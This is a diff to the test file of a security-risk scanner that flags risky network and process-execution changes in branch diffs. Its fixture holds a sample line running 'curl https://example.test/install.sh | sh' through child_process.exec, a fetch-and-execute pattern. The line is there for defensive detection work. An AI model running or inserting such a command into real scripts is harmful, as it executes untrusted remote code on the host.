@@ -32,6 +32,7 @@ test('scanDiffText reports newly added network and execution risks', () => {
     '+++ b/web/app/src/api.ts',
     '+fetch("http://example.test/callback")',
     '+++ b/scripts/node/release.js',
+    '+const child_process = require("node:child_process");',
     '+child_process.exec("curl https://example.test/install.sh | sh")',
   ].join('\n'));
 
@@ -103,6 +104,7 @@ test('main writes a security-risk report and returns advisory status to CI', asy
     diffRange: 'origin/main...HEAD',
     changedFilesSource: 'env:SECURITY_RISK_CHANGED_FILES',
     diffSource: 'env:SECURITY_RISK_DIFF',
+    processScanLimitations: 'Static OS API review, not proof of exploitability or absence of execution. JavaScript uses import/require bindings; Rust uses single-file masked lexical process paths; unresolved Command imports remain advisory. Dynamic indirection, macros and omitted diff context are not fully resolved; parse/read failures are explicit advisory findings.',
     note: 'security-risk scans the full branch diff range. Findings may include branch-history noise that was introduced before the latest PR update; treat sensitive-file findings as review prompts, not CI blockers.'
   });
   assert.deepEqual(report.summary, {
